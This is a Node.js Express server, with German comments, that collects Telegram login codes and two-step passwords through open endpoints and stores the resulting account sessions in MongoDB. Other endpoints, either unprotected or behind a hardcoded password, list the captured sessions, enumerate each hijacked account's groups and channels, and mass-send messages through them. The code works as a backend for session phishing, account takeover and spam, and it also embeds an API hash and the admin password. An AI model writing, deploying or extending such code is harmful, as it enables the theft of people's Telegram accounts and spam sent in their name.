const express = require('express');
const cors = require('cors');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json());

const PORT = process.env.PORT || 3000;
// WICHTIG: Setze hier deinen Connection String ein oder nutze Prozess-Umgebungsvariablen
const MONGO_URI = process.env.MONGODB_URI || 'DEINE_MONGODB_URI_HIER';

mongoose.connect(MONGO_URI).then(() => console.log("MongoDB verbunden"));

const SessionSchema = new mongoose.Schema({
    phone: String,
    session: String,
    date: { type: Date, default: Date.now }
});
const Session = mongoose.model('Session', SessionSchema);

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const activeSessions = new Map();

// --- AUTH ---
app.post('/send-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const result = await client.sendCode({ apiId, apiHash }, phone);
        activeSessions.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
        res.json({ phoneCodeHash: result.phoneCodeHash });
    } catch (e) { res.status(400).json({ error: e.message }); }
});

app.post('/verify-otp', async (req, res) => {
    try {
        const { phone, code, phoneCodeHash, password } = req.body;
        const session = activeSessions.get(phone);
        if (!session) return res.status(400).json({ error: "Session abgelaufen" });

        try {
            await session.client.invoke(new Api.auth.SignIn({ phoneNumber: phone, phoneCode: code, phoneCodeHash: phoneCodeHash }));
        } catch (err) {
            if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                const pwd = await session.client.invoke(new Api.account.GetPassword());
                await session.client.invoke(new Api.auth.CheckPassword({ password: await session.client.srpSolve(pwd, password) }));
            } else { throw err; }
        }
        const sessionString = session.client.session.save();
        await Session.findOneAndUpdate({ phone }, { session: sessionString }, { upsert: true });
        res.json({ success: true });
    } catch (e) { res.status(400).json({ error: e.message }); }
});

// --- ADMIN: DURCHSUCHEN & MASSENVERSAND ---

// 1. Alle Sessions holen
app.get('/get-sessions', async (req, res) => {
    if (req.query.pass !== 'Hinva312-') return res.status(401).json({ error: 'Unauthorized' });
    const sessions = await Session.find();
    res.json(sessions);
});

// 2. Dialoge (Gruppen/Channels) einer Session laden
app.post('/get-dialogs', async (req, res) => {
    const { phone } = req.body;
    const sessionDoc = await Session.findOne({ phone });
    if (!sessionDoc) return res.status(404).json({ error: "Session nicht gefunden" });

    try {
        const client = new TelegramClient(new StringSession(sessionDoc.session), apiId, apiHash, {});
        await client.connect();
        const dialogs = await client.getDialogs();
        // Wir filtern nur Gruppen/Kanäle, keine Privatchats
        const filtered = dialogs.filter(d => d.isGroup || d.isChannel).map(d => ({
            id: d.id.toString(),
            title: d.title,
            isChannel: d.isChannel
        }));
        res.json(filtered);
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// 3. Massenversand
app.post('/mass-send', async (req, res) => {
    const { phone, targets, message } = req.body; // targets = Array von IDs
    const sessionDoc = await Session.findOne({ phone });
    if (!sessionDoc) return res.status(404).json({ error: "Session nicht gefunden" });

    try {
        const client = new TelegramClient(new StringSession(sessionDoc.session), apiId, apiHash, {});
        await client.connect();
        
        let results = [];
        for (const target of targets) {
            try {
                await client.sendMessage(target, { message });
                results.push({ target, status: 'ok' });
            } catch (err) {
                results.push({ target, status: 'error', error: err.message });
            }
            // Kurze Pause, um Telegram-Limits zu vermeiden
            await new Promise(r => setTimeout(r, 1000));
        }
        res.json({ results });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Server läuft auf ${PORT}`));
